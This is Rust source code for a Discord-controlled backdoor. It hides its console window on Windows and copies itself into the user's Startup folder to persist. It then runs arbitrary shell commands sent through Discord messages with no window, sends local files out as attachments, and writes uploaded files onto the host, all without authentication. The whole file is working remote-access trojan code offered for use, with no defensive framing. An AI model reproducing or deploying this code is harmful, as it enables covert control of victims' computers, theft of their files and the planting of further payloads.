// Disable console window on Windows
#![cfg_attr(target_os = "windows", windows_subsystem = "windows")]

use serenity::all::GatewayIntents;
use serenity::async_trait;
use serenity::builder::{CreateAttachment, CreateMessage};
use serenity::model::channel::Message;
use serenity::model::gateway::Ready;
use serenity::prelude::*;
use std::env;
use std::path::Path;
use std::process::Stdio;
use tokio::process::Command;

struct Handler;

#[cfg(windows)]
const CREATE_NO_WINDOW: u32 = 0x08000000;

#[async_trait]
impl EventHandler for Handler {
    async fn message(&self, ctx: Context, msg: Message) {
        if msg.content == "!ping" {
            if let Err(why) = msg.channel_id.say(&ctx.http, "Pong!").await {
                println!("Error sending message: {why:?}");
            }
        }
        if msg.content == "!help" {
            let help_text = "```Available commands:
!ping                - Responds with 'Pong'
!help                - Shows help section
!run <command>       - Executes a shell command
!cd <directory>      - Changes the current directory
!ls                  - Lists files and directories
!download <file>     - Downloads the specified file
!upload (attachment) - Uploads the attached file```";

            if let Err(why) = msg.channel_id.say(&ctx.http, help_text).await {
                println!("Error sending message: {why:?}");
            }
        }
        if msg.content.starts_with("!run ") {
            let command = msg.content.strip_prefix("!run ").unwrap_or("");
            let output = {
                #[cfg(windows)]
                {
                    Command::new("cmd")
                        .arg("/C")
                        .arg(command)
                        .stdin(Stdio::null())
                        .stdout(Stdio::piped())
                        .stderr(Stdio::piped())
                        .creation_flags(CREATE_NO_WINDOW)
                        .output()
                        .await
                }
                #[cfg(unix)]
                {
                    Command::new("sh")
                        .arg("-c")
                        .arg(command)
                        .stdin(Stdio::null())
                        .stdout(Stdio::piped())
                        .stderr(Stdio::piped())
                        .output()
                        .await
                }
            };

            if let Ok(output) = output {
                let stdout = String::from_utf8_lossy(&output.stdout);
                let stderr = String::from_utf8_lossy(&output.stderr);
                let response = if !stdout.is_empty() {
                    stdout.to_string()
                } else if !stderr.is_empty() {
                    stderr.to_string()
                } else {
                    "Command executed, but no output.".to_string()
                };

                let _ = msg.channel_id.say(&ctx.http, response).await;
            }
        }
        if msg.content.starts_with("!cd ") {
            let directory = msg.content.strip_prefix("!cd ").unwrap_or("");
            if !directory.is_empty() {
                match env::set_current_dir(directory) {
                    Ok(_) => {
                        if let Err(why) = msg.channel_id.say(&ctx.http, format!("Done")).await {
                            println!("Error sending message: {why:?}");
                        }
                    }
                    Err(why) => println!("Error changing directory: {why:?}"),
                }
            }
        }
        if msg.content == "!ls" {
            let output = if cfg!(target_os = "windows") {
                Command::new("cmd").args(["/C", "dir"]).output()
            } else {
                Command::new("ls").arg("-la").output()
            };

            match output.await {
                Ok(output) => {
                    let result = String::from_utf8_lossy(&output.stdout);
                    let response = format!("```{}```", result);
                    // TODO handle - Error sending message: Model(MessageTooLong(2085))
                    if let Err(why) = msg.channel_id.say(&ctx.http, response).await {
                        println!("Error sending message: {why:?}");
                    }
                }
                Err(why) => {
                    println!("Error retrieving output: {why:?}");
                }
            }
        }
        if msg.content.starts_with("!download ") {
            let file_path = msg.content.strip_prefix("!download ").unwrap_or("");
            let path = Path::new(file_path);

            if path.exists() && path.is_file() {
                let builder =
                    CreateMessage::new().add_file(CreateAttachment::path(path).await.unwrap());

                if let Err(why) = msg.channel_id.send_message(&ctx.http, builder).await {
                    println!("Error sending message: {why:?}");
                }
            } else {
                let _ = msg.channel_id.say(&ctx.http, "File not found!").await;
            }
        }
        if msg.content == "!upload" {
            if let Some(attachment) = msg.attachments.first() {
                let file_url = &attachment.url;
                let file_name = attachment.filename.clone();
                println!("{}: {}", file_name, file_url);

                let local_path = file_name.clone();

                match reqwest::get(file_url).await {
                    Ok(response) if response.status().is_success() => {
                        if let Ok(bytes) = response.bytes().await {
                            if let Err(why) = tokio::fs::write(local_path.clone(), bytes).await {
                                println!("Error saving file: {why:?}");
                            } else {
                                msg.channel_id
                                    .say(&ctx.http, format!("File uploaded as: {}", local_path))
                                    .await
                                    .unwrap();
                            }
                        }
                    }
                    Ok(response) => {
                        msg.channel_id
                            .say(
                                &ctx.http,
                                format!("Error downloading file: {:?}", response.status()),
                            )
                            .await
                            .unwrap();
                    }
                    Err(_) => {
                        msg.channel_id
                            .say(&ctx.http, "Error downloading file")
                            .await
                            .unwrap();
                    }
                }
            } else {
                msg.channel_id
                    .say(&ctx.http, "No file attached")
                    .await
                    .unwrap();
            }
        }
    }

    async fn ready(&self, _: Context, ready: Ready) {
        println!("{} is connected!", ready.user.name);
    }
}

#[cfg(target_os = "windows")]
async fn copy_to_startup() {
    use std::env;
    use std::fs;

    if let Ok(exe_path) = env::current_exe() {
        if let Some(exe_name) = exe_path.file_name() {
            let startup_path = format!(
                "{}\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\{}",
                env::var("APPDATA").unwrap(),
                exe_name.to_string_lossy()
            );

            let _ = fs::remove_file(&startup_path);
            let _ = fs::copy(&exe_path, &startup_path);
        }
    }
}

#[tokio::main]
async fn main() {
    #[cfg(target_os = "windows")]
    copy_to_startup().await;

    let token = env::var("DISCORD_TOKEN").expect("Expected a token in the environment");

    let intents = GatewayIntents::GUILD_MESSAGES
        | GatewayIntents::DIRECT_MESSAGES
        | GatewayIntents::MESSAGE_CONTENT;

    let mut client = Client::builder(&token, intents)
        .event_handler(Handler)
        .await
        .expect("Err creating client");

    if let Err(why) = client.start().await {
        println!("Client error: {why:?}");
    }
}
